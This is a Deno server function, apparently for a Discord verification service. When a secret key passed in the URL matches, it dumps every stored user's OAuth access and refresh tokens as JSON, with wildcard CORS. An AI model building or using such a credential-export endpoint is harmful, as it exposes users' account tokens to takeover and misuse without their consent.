import { serve } from "https://deno.land/std@0.177.0/http/server.ts";
import { createClient } from "npm:@blinkdotnew/sdk";

const blink = createClient({
  projectId: Deno.env.get('BLINK_PROJECT_ID')!,
  authRequired: false
});

serve(async (req) => {
  // Handle CORS
  if (req.method === 'OPTIONS') {
    return new Response(null, {
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization',
      },
    });
  }

  try {
    const { searchParams } = new URL(req.url);
    const authKey = searchParams.get('key');
    
    // Verify owner key
    const ownerKey = Deno.env.get('OWNER_LOGIN_KEY');
    if (authKey !== ownerKey) {
      return new Response(JSON.stringify({ error: 'Unauthorized' }), {
        status: 401,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*',
        },
      });
    }

    // Get all verified users with access tokens
    const verifiedUsers = await blink.db.verified_users.list({
      orderBy: { created_at: 'desc' }
    });

    // Format the data for export
    const exportData = verifiedUsers.map(user => ({
      user_id: user.user_id,
      username: user.username,
      discriminator: user.discriminator,
      avatar_url: user.avatar_url,
      access_token: user.access_token,
      refresh_token: user.refresh_token,
      created_at: user.created_at,
      guild_id: user.guild_id
    }));

    return new Response(JSON.stringify({
      success: true,
      count: exportData.length,
      users: exportData,
      exported_at: new Date().toISOString()
    }), {
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
      },
    });

  } catch (error) {
    console.error('Export error:', error);
    return new Response(JSON.stringify({ 
      error: 'Failed to export data',
      details: error.message 
    }), {
      status: 500,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
      },
    });
  }
});